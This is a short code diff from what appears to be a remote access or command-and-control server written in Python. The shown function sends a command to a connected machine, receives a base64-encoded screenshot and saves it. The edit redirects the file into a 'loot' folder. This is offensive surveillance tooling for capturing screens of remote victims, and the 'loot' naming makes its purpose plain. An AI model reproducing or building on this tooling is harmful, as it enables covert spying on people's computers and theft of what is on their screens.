@@ -142,7 +142,8 @@ def handle_connection(connection,address,thread_index):
                     connection.send(cmd.encode())
                     encodedimage = connection.recv(BUFFER_SIZE*100).decode()
                     imagebytes = base64.b64decode(encodedimage)
-                    f = open("temp.jpg","wb")
+                    
+                    f = open(".\\loot\\temp.jpg","wb")
                     f.write(imagebytes)
                     f.close()
                     CMD_OUTPUT[thread_index] = "Screenshot Captured"
